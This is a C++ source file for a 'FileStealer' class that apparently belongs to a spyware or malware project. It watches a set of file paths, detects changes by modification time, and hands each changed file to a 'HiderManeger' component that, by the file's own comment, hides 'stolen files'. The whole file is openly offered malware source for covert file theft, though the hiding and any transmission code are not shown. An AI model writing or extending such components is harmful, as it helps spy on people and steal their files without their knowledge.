#include "FileStealer.h"

FileStealer::FileStealer() {}
FileStealer::~FileStealer() {}

FileStealer::FileStealer(std::vector<std::string> paths) {
    for (std::string p : paths) {
        files.insert({ p, 0 });
    }
}

void FileStealer::addFilePath(std::string path) {
    files.insert({ path, 0 });
}

void FileStealer::rmFilePath(std::string path) {
    files.erase(path);
}

void FileStealer::printFilePaths() {
    for (auto const & path : files) {
        std::cout << path.first << std::endl;
    }
}

std::map <std::string, time_t> FileStealer::getFiles() {
    std::map <std::string, time_t> copiedPaths = files;
    return copiedPaths;
}

int FileStealer::halt() {
    return 0;
}

// sends stolen files to hide in hider
int FileStealer::run(const ContParams contParams) {

    for (auto const & file : files) {
        if (hasFileChanged(file.first)) {
            HiderManeger& h = HiderManeger::getInstance();
            h.hideFile(file.first, std::to_string(file.second));
        }
    }

    return 0;
}

// checks if was updated from last time. changes .second to be last update time
bool FileStealer::hasFileChanged(std::string path) {
    struct stat fileInfo;
    if (stat(path.c_str(), &fileInfo) != 0) {
        std::cout << path << " not found" << std::endl;
        return false;
    }

    if (fileInfo.st_mtime != files.at(path)) {
        files[path] = fileInfo.st_mtime;
        return true; 
    }

    return false; 
}
